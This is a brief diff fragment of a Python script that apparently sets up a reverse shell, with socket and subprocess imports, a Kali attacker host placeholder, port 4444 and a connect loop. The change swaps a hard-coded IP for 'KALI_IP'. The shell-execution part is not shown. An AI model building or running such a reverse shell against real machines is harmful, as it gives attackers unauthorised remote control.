@@ -2,7 +2,7 @@ import socket
 import subprocess
 import os
 
-host = "192.168.0.168"  # replace with your Kali machine IP
+host = "KALI_IP"  # replace with your Kali machine IP
 port = 4444
 
 while True:
